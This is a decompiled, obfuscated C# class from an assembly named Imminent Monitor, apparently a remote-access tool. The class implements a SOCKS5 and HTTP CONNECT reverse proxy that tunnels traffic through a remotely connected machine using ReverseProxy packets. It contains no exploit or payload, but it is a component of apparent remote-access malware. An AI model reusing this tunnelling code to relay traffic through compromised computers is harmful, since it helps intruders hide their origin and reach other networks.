// Decompiled with JetBrains decompiler
// Type: GClass16
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

public sealed class GClass16
{
  public Socket socket_0;
  public GClass18 gclass18_0;
  private bool bool_0;
  private MemoryStream memoryStream_0;
  private long long_0;
  private long long_1;
  private long long_2;
  private long long_3;
  private byte[] byte_0;
  private GClass27 gclass27_0;
  private string string_0;
  private ushort ushort_0;
  public string string_1;
  private bool bool_1;
  public bool bool_2;
  public GClass16.GEnum4 genum4_0;
  private bool bool_3;
  private bool bool_4;
  private bool bool_5;
  private bool bool_6;

  public GClass16(GClass18 gclass18_1, Socket socket_1, GClass27 gclass27_1)
  {
    this.bool_0 = false;
    this.socket_0 = socket_1;
    this.gclass18_0 = gclass18_1;
    this.memoryStream_0 = new MemoryStream();
    this.byte_0 = new byte[8192];
    this.method_13(true);
    this.method_9(string.Empty);
    this.genum4_0 = (GClass16.GEnum4) 0;
    this.gclass27_0 = gclass27_1;
    try
    {
      socket_1.BeginReceive(this.byte_0, 0, this.byte_0.Length, SocketFlags.None, new AsyncCallback(this.method_15), (object) null);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.method_16();
      ProjectData.ClearProjectError();
    }
  }

  public long method_0() => this.long_0;

  public void method_1(long long_4) => this.long_0 = long_4;

  public long method_2() => this.long_1;

  public void method_3(long long_4) => this.long_1 = long_4;

  public long method_4() => this.long_2;

  public void method_5(long long_4) => this.long_2 = long_4;

  public long method_6() => this.long_3;

  public void method_7(long long_4) => this.long_3 = long_4;

  public string method_8() => this.string_0;

  public void method_9(string string_2) => this.string_0 = string_2;

  public ushort method_10() => this.ushort_0;

  public void method_11(ushort ushort_1) => this.ushort_0 = ushort_1;

  public bool method_12() => this.bool_1;

  public void method_13(bool bool_7) => this.bool_1 = bool_7;

  public int method_14() => this.socket_0.Handle.ToInt32();

  private void method_15(IAsyncResult iasyncResult_0)
  {
    try
    {
      int count = this.socket_0.EndReceive(iasyncResult_0);
      if (count <= 0)
      {
        this.method_16();
        return;
      }
      if (count <= 5000 && this.memoryStream_0.Length + (long) count <= 5000L)
      {
        this.method_5(this.method_4() + (long) count);
        this.memoryStream_0.Write(this.byte_0, 0, count);
      }
      else
      {
        this.method_16();
        return;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.method_16();
      ProjectData.ClearProjectError();
      return;
    }
    byte[] array = this.memoryStream_0.ToArray();
    switch (this.method_0())
    {
      case 0:
        if (array.Length >= 3)
        {
          string str1 = Encoding.ASCII.GetString(array);
          if (array[0] == (byte) 5)
            this.genum4_0 = (GClass16.GEnum4) 1;
          else if (str1.StartsWith("CONNECT"))
          {
            if (str1.Contains(":"))
            {
              this.genum4_0 = (GClass16.GEnum4) 2;
              using (StreamReader streamReader = new StreamReader((Stream) new MemoryStream(array)))
              {
                string str2 = streamReader.ReadLine();
                if (str2 != null)
                {
                  string[] strArray = str2.Split(new string[1]
                  {
                    " "
                  }, StringSplitOptions.RemoveEmptyEntries);
                  if (strArray.Length > 0)
                  {
                    try
                    {
                      string str3 = strArray[1];
                      this.method_9(str3.Split(':')[0]);
                      this.method_11(ushort.Parse(str3.Split(':')[1]));
                      if (Operators.CompareString(this.method_8(), "127.0.0.2", false) == 0 | Operators.CompareString(this.method_8(), "255.255.255.255", false) == 0)
                        this.method_9("127.0.0.1");
                      this.bool_3 = true;
                      this.bool_5 = true;
                      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[5]
                      {
                        (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ReverseProxy,
                        (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProxyPacket.ReverseProxyConnect,
                        (object) this.method_14(),
                        (object) this.method_8(),
                        (object) this.method_10()
                      });
                      this.gclass27_0.method_10(this);
                      return;
                    }
                    catch (Exception ex)
                    {
                      ProjectData.SetProjectError(ex);
                      this.method_16();
                      ProjectData.ClearProjectError();
                    }
                  }
                }
                else
                  break;
              }
            }
            else
              break;
          }
          else
            break;
          if (this.method_20(array))
          {
            this.method_19();
            this.method_1(this.method_0() + 1L);
            this.memoryStream_0.SetLength(0L);
            this.gclass27_0.method_10(this);
            break;
          }
          break;
        }
        break;
      case 1:
        int num = 6;
        if (array.Length >= 6)
        {
          if (!this.method_20(array))
            return;
          this.bool_3 = array[1] == (byte) 1;
          this.bool_4 = array[3] == (byte) 1;
          this.bool_5 = array[3] == (byte) 3;
          Array.Reverse((Array) array, array.Length - 2, 2);
          this.method_11(BitConverter.ToUInt16(array, array.Length - 2));
          if (this.bool_3)
          {
            if (this.bool_4)
              this.method_9(Conversions.ToString(array[4]) + "." + Conversions.ToString(array[5]) + "." + Conversions.ToString(array[6]) + "." + Conversions.ToString(array[7]));
            else if (this.bool_5)
            {
              int count = (int) array[4];
              if (num + count < array.Length)
                this.method_9(Encoding.ASCII.GetString(array, 5, count));
            }
            if (this.method_8().Length > 0)
            {
              if (Operators.CompareString(this.method_8(), "127.0.0.2", false) == 0 | Operators.CompareString(this.method_8(), "255.255.255.255", false) == 0)
                this.method_9("127.0.0.1");
              dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[5]
              {
                (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ReverseProxy,
                (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProxyPacket.ReverseProxyConnect,
                (object) this.method_14(),
                (object) this.method_8(),
                (object) this.method_10()
              });
            }
            this.gclass27_0.method_11(this);
            return;
          }
          this.method_18();
          return;
        }
        break;
    }
    try
    {
      this.socket_0.BeginReceive(this.byte_0, 0, this.byte_0.Length, SocketFlags.None, new AsyncCallback(this.method_15), (object) null);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.method_16();
      ProjectData.ClearProjectError();
    }
  }

  public void method_16()
  {
    if (!this.bool_6)
    {
      this.bool_6 = true;
      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
      {
        (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ReverseProxy,
        (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProxyPacket.ReverseProxyDisconnect,
        (object) this.method_14()
      });
    }
    try
    {
      this.socket_0.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    this.method_13(false);
    this.gclass27_0.method_11(this);
  }

  public void method_17(byte[] byte_1)
  {
    lock (this.socket_0)
    {
      try
      {
        this.method_7(this.method_6() + (long) byte_1.Length);
        this.socket_0.Send(byte_1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.method_16();
        ProjectData.ClearProjectError();
      }
    }
    this.gclass27_0.method_11(this);
  }

  private void method_18()
  {
    if (this.genum4_0 == (GClass16.GEnum4) 2)
      this.method_16();
    if (this.genum4_0 != (GClass16.GEnum4) 1)
      return;
    this.method_17(new byte[2]{ (byte) 5, byte.MaxValue });
    this.method_16();
  }

  private void method_19()
  {
    if (this.genum4_0 != (GClass16.GEnum4) 1)
      return;
    this.method_17(new byte[2]{ (byte) 5, (byte) 0 });
  }

  private bool method_20(byte[] byte_1)
  {
    if (this.genum4_0 == (GClass16.GEnum4) 2 || byte_1.Length <= 0 || byte_1[0] == (byte) 5)
      return true;
    this.method_18();
    this.method_16();
    return false;
  }

  public void method_21(int int_0, bool bool_7, long long_4, int int_1, string string_2)
  {
    if (this.bool_0)
      return;
    this.bool_0 = true;
    if (bool_7)
    {
      this.string_1 = string_2;
      if (this.genum4_0 == (GClass16.GEnum4) 2)
        this.method_17(Encoding.ASCII.GetBytes("HTTP/1.0 200 Connection established\r\n\r\n"));
      else if (this.genum4_0 == (GClass16.GEnum4) 1)
      {
        try
        {
          IPAddress ipAddress = new IPAddress(long_4);
          List<byte> byteList = new List<byte>();
          byteList.Add((byte) 5);
          byteList.Add((byte) 0);
          byteList.Add((byte) 0);
          byteList.Add((byte) 1);
          byteList.AddRange((IEnumerable<byte>) ipAddress.GetAddressBytes());
          byteList.Add(Convert.ToByte(Math.Floor(new Decimal((double) int_1 / 256.0))));
          byteList.Add((byte) (int_1 % 256));
          this.method_17(byteList.ToArray());
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.method_17(new byte[10]
          {
            (byte) 5,
            (byte) 0,
            (byte) 0,
            (byte) 1,
            (byte) 0,
            (byte) 0,
            (byte) 0,
            (byte) 0,
            (byte) 0,
            (byte) 0
          });
          ProjectData.ClearProjectError();
        }
      }
      this.memoryStream_0.Close();
      this.bool_2 = true;
      try
      {
        this.socket_0.BeginReceive(this.byte_0, 0, this.byte_0.Length, SocketFlags.None, new AsyncCallback(this.method_22), (object) null);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.method_16();
        ProjectData.ClearProjectError();
      }
    }
    else if (this.genum4_0 == (GClass16.GEnum4) 2)
      this.method_16();
    else if (this.genum4_0 == (GClass16.GEnum4) 1)
      this.method_17(new byte[10]
      {
        (byte) 5,
        (byte) 5,
        (byte) 0,
        (byte) 1,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0
      });
    this.gclass27_0.method_11(this);
  }

  private void method_22(IAsyncResult iasyncResult_0)
  {
    try
    {
      int length = this.socket_0.EndReceive(iasyncResult_0);
      if (length <= 0)
      {
        this.method_16();
        return;
      }
      this.method_5(this.method_4() + (long) length);
      byte[] destinationArray = new byte[length - 1 + 1];
      Array.Copy((Array) this.byte_0, (Array) destinationArray, length);
      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[4]
      {
        (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ReverseProxy,
        (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProxyPacket.ReverseProxyData,
        (object) this.method_14(),
        (object) destinationArray
      });
      this.method_7(this.method_6() + (long) destinationArray.Length);
      this.method_3(this.method_2() + 1L);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.method_16();
      ProjectData.ClearProjectError();
      return;
    }
    this.method_1(this.method_0() + 1L);
    this.gclass27_0.method_11(this);
    try
    {
      this.socket_0.BeginReceive(this.byte_0, 0, this.byte_0.Length, SocketFlags.None, new AsyncCallback(this.method_22), (object) null);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public enum GEnum4
  {
  }
}
